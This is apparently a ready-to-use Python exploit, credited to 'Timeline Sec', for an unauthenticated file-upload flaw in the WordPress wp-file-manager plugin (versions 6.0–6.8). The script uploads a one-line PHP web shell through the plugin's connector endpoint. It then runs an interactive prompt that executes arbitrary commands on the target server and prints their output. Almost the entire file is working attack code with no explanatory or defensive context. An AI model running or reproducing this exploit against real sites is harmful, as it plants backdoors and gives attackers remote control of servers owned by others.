#!/usr/bin/python3
# -*- coding: UTF-8 -*-
"""
@Author  : xDroid
@File    : file_manager_Rce.py
@Time    : 2020/9/21
"""
import requests
requests.packages.urllib3.disable_warnings()
from hashlib import md5
import random
import json
import optparse
import sys

GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
ENDC = '\033[0m'

proxies={ 'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080' }

def randmd5():
    new_md5 = md5()
    new_md5.update(str(random.randint(1, 1000)).encode())
    return new_md5.hexdigest()[:6]+'.php'

def file_manager(url):
    if not url:
        print('#Usage : python3 file_manager_upload.py -u http://127.0.0.1')
        sys.exit()
    vuln_url=url.strip()+"/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
    filename=randmd5()
    headers={
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0',
        'Content-Type':'multipart/form-data;boundary=---------------------------42474892822150178483835528074'
    }
    data="-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n1744f7298611ba\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"%s\"\r\nContent-Type: application/php\r\n\r\n<?php system($_GET['cmd']); ?>\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1597850374\r\n-----------------------------42474892822150178483835528074--\r\n"%filename
    try:
        resp=requests.post(url=vuln_url,headers=headers,data=data,timeout=3, verify=False)
        result = json.loads(resp.text)
        if filename == result['added'][0]['url'].split('/')[-1]:
            print(GREEN+'[+]\t\t'+ENDC+YELLOW+'File Uploaded Success\t\t'+ENDC)
            while(True):
                command = input("请输入执行的命令:")
                if "q" == command:
                    sys.exit()
                exec_url = url+'/wp-content/plugins/wp-file-manager/lib/files/'+filename+'?cmd='+command.strip()
                exec_resp = requests.get(url=exec_url)
                exec_resp.encoding='gb2312'
                print(exec_resp.text)

        else:
            print(RED+'[-]\t\tUploaded failed\t\t'+ENDC)
    except Exception as e:
        print(RED + '[-]\t\tUploaded failed\t\t' + ENDC)


if __name__ == '__main__':
    banner = GREEN+'''
      __ _ _                                                    
     / _(_) | ___   _ __ ___   __ _ _ __   __ _  __ _  ___ _ __ 
    | |_| | |/ _ \ | '_ ` _ \ / _` | '_ \ / _` |/ _` |/ _ \ '__|
    |  _| | |  __/ | | | | | | (_| | | | | (_| | (_| |  __/ |   
    |_| |_|_|\___| |_| |_| |_|\__,_|_| |_|\__,_|\__, |\___|_|   
                                                |___/           
                    by: Timeline Sec
                    file manager 6.0-6.8 file upload
    '''+ENDC
    print(banner)
    parser = optparse.OptionParser('python3 %prog' + '-h')
    parser.add_option('-u', dest='url', type='str', help='wordpress url')
    (options, args) = parser.parse_args()
    file_manager(options.url)
